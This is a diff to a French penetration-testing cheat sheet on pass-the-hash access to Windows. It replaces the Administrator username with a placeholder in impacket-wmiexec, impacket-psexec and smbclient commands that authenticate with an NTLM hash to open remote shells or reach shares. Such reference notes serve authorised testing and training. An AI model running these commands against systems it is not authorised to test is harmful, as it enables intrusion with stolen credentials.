@@ -103,16 +103,13 @@ nxc ldap <IP> -u Administrator -H '<NTLM_HASH>'
 
 ```bash
 # shell via WMI
-impacket-wmiexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>
+impacket-wmiexec -hashes :'<NTLM_HASH>' <user>@<IP_CIBLE>
 
 # shell via PsExec (crée un service)
-impacket-psexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>
-```
+impacket-psexec -hashes :'<NTLM_HASH>' <user>@<IP_CIBLE>
 
-**smbclient**
-
-```bash
-smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash '<NTLM_HASH>'
+# smbclient
+impacket-smbclient -hashes :'<NTLM_HASH>' <user>@<IP_CIBLE>
 ```
 
 **evil-winrm**
